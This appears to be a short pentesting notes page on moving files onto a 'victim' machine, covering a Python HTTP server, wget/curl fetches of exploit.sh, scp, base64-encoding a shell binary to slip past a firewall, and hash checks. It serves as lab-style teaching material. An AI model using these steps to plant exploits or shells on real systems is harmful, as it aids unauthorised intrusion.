---
title: Notes | Transfer Files
author: Zeropio
date: 2022-07-13
categories: [Notes, System]
tags: []
permalink: /notes/system/transfer-files
---

# wget

We can start a Python http server on our machine:
```console
zero@pio$ sudo python3 -m http.server 80

  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

And then download our files:
```console
victim@machine$ wget http://<ip>:<port>/exploit.sh 
victim@machine$ curl http://<ip>:<port>/exploit.sh -o exploit.sh 
```

---

# scp

We can even use **scp**:
```console
zero@pio$ scp exploit.sh victim@machine:/tmp/exploit.sh 
```

---

# base64

If the machine has a firewall that prevent this the file transfer we can encode it:
```console
zero@pio$ base64 shell -w 0
  f0VM.. <SNIP> ...mDwU
```

And in the victim:
```console
victim@machine$ echo f0VM... <SNIP> ...mDwU | base64 -d > shell
```

---

# Validating

The **file** command can be use to validate:
```console
victim@machine$ file shell
  shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

Also we can check the hash in both machines:
```console
zero@pio$ md5sum shell

victim@machine$ md5sum shell
```




